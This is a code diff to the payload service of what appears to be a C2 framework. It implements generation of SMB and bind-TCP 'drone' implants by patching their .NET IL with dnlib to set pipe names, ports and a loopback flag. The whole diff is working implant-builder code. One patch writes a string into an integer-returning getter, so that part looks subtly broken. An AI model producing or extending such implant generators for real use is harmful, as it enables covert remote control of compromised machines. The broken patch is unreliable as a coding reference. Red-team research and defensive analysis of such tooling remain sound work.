@@ -1,6 +1,7 @@
 ﻿using System.Text;
 
 using dnlib.DotNet;
+using dnlib.DotNet.Emit;
 using dnlib.DotNet.Writer;
 using dnlib.PE;
 
@@ -56,7 +57,7 @@ public class PayloadService : IPayloadService
             case PayloadType.BIND_TCP:
             {
                 var bindTcpHandler = (TcpHandler)handler;
-                drone = await GenerateBindTcpDrone(bindTcpHandler.Port);
+                drone = await GenerateBindTcpDrone(bindTcpHandler.Port, bindTcpHandler.Loopback);
                 
                 break;
             }
@@ -118,7 +119,7 @@ public class PayloadService : IPayloadService
     {
         var drone = await GetDroneModule();
         
-        // get the http handler
+        // get the http comm module
         var httpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.HttpCommModule");
         
         // set schema
@@ -141,12 +142,60 @@ public class PayloadService : IPayloadService
 
     private async Task<byte[]> GenerateBindSmbDrone(string pipeName)
     {
-        throw new NotImplementedException();
+        var drone = await GetDroneModule();
+        
+        // get the smb comm module
+        var smbCommModuleDef = GetTypeDef(drone, "Drone.CommModules.SmbCommModule");
+        
+        // set pipename
+        var pipeNameDef = GetMethodDef(smbCommModuleDef, "System.String Drone.CommModules.SmbCommModule::get_PipeName()");
+        pipeNameDef.Body.Instructions[0].Operand = pipeName;
+        
+        // get main comm module
+        var droneDef = GetTypeDef(drone, "Drone.Drone");
+        var getCommModuleDef = GetMethodDef(droneDef, "Drone.CommModules.CommModule Drone.Drone::GetCommModule()");
+        
+        // smb module ctor
+        var smbCommModuleCtor = GetMethodDef(smbCommModuleDef, "System.Void Drone.CommModules.SmbCommModule::.ctor()");
+        
+        // set main comm module
+        getCommModuleDef.Body.Instructions[0].Operand = smbCommModuleCtor;
+        
+        await using var ms = new MemoryStream();
+        drone.Write(ms);
+
+        return ms.ToArray();
     }
 
-    private async Task<byte[]> GenerateBindTcpDrone(int bindPort)
+    private async Task<byte[]> GenerateBindTcpDrone(int bindPort, bool loopback)
     {
-        throw new NotImplementedException();
+        var drone = await GetDroneModule();
+        
+        // get the tcp comm module
+        var tcpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.TcpCommModule");
+
+        // set port
+        var portDef = GetMethodDef(tcpCommModuleDef, "System.Int32 Drone.CommModules.TcpCommModule::get_BindPort()");
+        portDef.Body.Instructions[0].Operand = bindPort.ToString();
+        
+        // set loopback
+        var loopbackDef = GetMethodDef(tcpCommModuleDef, "System.Boolean Drone.CommModules.TcpCommModule::get_Loopback()");
+        loopbackDef.Body.Instructions[0].OpCode = loopback ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
+        
+        // get main comm module
+        var droneDef = GetTypeDef(drone, "Drone.Drone");
+        var getCommModuleDef = GetMethodDef(droneDef, "Drone.CommModules.CommModule Drone.Drone::GetCommModule()");
+        
+        // tcp module ctor
+        var tcpCommModuleCtor = GetMethodDef(tcpCommModuleDef, "System.Void Drone.CommModules.TcpCommModule::.ctor()");
+        
+        // set main comm module
+        getCommModuleDef.Body.Instructions[0].Operand = tcpCommModuleCtor;
+        
+        await using var ms = new MemoryStream();
+        drone.Write(ms);
+
+        return ms.ToArray();
     }
 
     private async Task<byte[]> GenerateReverseTcpDrone(string connectAddress, int connectPort)
